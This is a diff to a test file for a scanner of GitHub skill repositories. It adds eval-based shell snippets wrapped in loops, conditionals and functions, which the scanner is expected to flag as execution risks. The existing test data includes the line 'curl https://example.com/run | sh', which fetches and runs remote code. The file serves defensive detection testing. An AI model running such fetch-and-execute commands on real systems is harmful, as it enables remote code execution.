@@ -323,7 +323,12 @@ describe('repository packages', () => {
       const result = await scanGitHubSkills(input, githubFixture({ 'skills/main/SKILL.md': md('main') + text }));
       expect(result.repositoryPackage?.error, text).toBeNull();
     }
-    for (const text of ['eval(userInput)', 'eval "$command"', 'eval echo hello', 'curl https://example.com/run | sh']) {
+    for (const text of ['eval(userInput)', 'eval "$command"', 'eval echo hello', 'curl https://example.com/run | sh',
+      'if true; then eval echo hello; fi', 'if eval echo hello; then echo done; fi',
+      'if false; then echo no; else eval echo hello; fi', 'while eval echo hello; do break; done',
+      'for item in one; do eval echo hello; done', 'result=$(eval echo hello)',
+      'run() { eval echo hello; }', 'if true; then command eval echo hello; fi',
+      "if true; then 'eval' echo hello; fi"]) {
       const result = await scanGitHubSkills(input, githubFixture({ 'skills/main/SKILL.md': md('main'), 'shared/run.sh': text }));
       expect(result.repositoryPackage?.error, text).toMatch(/execution/);
     }
